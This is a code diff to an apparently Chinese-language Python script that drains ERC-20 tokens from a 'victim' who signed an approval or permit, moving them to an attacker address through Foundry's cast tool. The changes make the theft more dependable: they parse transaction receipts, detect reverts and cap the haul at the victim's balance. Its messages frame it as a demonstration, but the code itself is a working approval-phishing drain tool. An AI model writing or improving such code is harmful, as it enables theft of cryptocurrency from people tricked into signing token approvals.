@@ -84,12 +84,23 @@ def send(url: str, to: str, data: str, key: str) -> str:
     if not pathlib.Path(cast).exists():
         raise SystemExit("[!] 需要 cast(Foundry),未找到;安装见 https://book.getfoundry.sh")
     proc = subprocess.run(
-        [cast, "send", to, "--rpc-url", url, "--private-key", key, "--data", "0x" + data.removeprefix("0x")],
+        [cast, "send", to, "--rpc-url", url, "--private-key", key,
+         "--data", "0x" + data.removeprefix("0x"), "--json"],
         capture_output=True, text=True, timeout=60,
     )
     if proc.returncode != 0:
         raise SystemExit(f"[!] 交易发送失败:\n{proc.stdout}{proc.stderr}")
-    return proc.stdout.strip().splitlines()[-1]
+    receipt = None
+    for line in reversed(proc.stdout.splitlines()):
+        line = line.strip()
+        if line.startswith("{"):
+            receipt = json.loads(line)
+            break
+    if not receipt:
+        raise SystemExit(f"[!] 无法解析 cast 回执:\n{proc.stdout[-400:]}")
+    if receipt.get("status") != "0x1":
+        raise SystemExit(f"[!] 交易在链上 revert(未生效),回执: {receipt.get('transactionHash')}")
+    return receipt["transactionHash"]
 
 
 def report(url: str, token: str, victim: str, attacker: str, label: str):
@@ -125,11 +136,13 @@ def main() -> int:
         if spender.lower() != ATTACKER.lower():
             print(f"[!] 注意:授权对象是 {spender},不是攻击者 {ATTACKER},演示继续(前提是攻击者即 spender)")
         onchain = balance_of(args.rpc, args.token, victim)
-        amount = min(amount, onchain)
+        print(f"[*] 从链上交易解析出:受害者 {victim} 授权 {amount} 枚")
+        if onchain < amount:
+            print(f"[*] 受害者余额仅 {onchain} 枚,按余额收割(授权额度外的拿不到)")
+            amount = onchain
         if amount == 0:
             raise SystemExit("[!] 授权额度或余额为 0,无可收割")
-        print(f"[*] 从链上交易解析出:受害者 {victim} 授权 {amount} 枚")
-        vb0 = balance_of(args.rpc, args.token, victim)
+        vb0 = onchain
         print(f"[*] 收割前受害者余额: {vb0}")
         drain(args.rpc, args.token, victim, amount, args.key)
         last = victim
@@ -146,8 +159,7 @@ def main() -> int:
         print("[*] permit 上链,授权已生效——受害者没有发过任何交易,只签过一个名")
         vb0 = balance_of(args.rpc, args.token, victim)
         print(f"[*] 收割前受害者余额: {vb0}")
-        onchain = balance_of(args.rpc, args.token, victim)
-        drain(args.rpc, args.token, victim, min(args.value, onchain), args.key)
+        drain(args.rpc, args.token, victim, min(args.value, vb0), args.key)
         last = victim
 
     vb1, ab1 = balance_of(args.rpc, args.token, last), balance_of(args.rpc, args.token, ATTACKER)
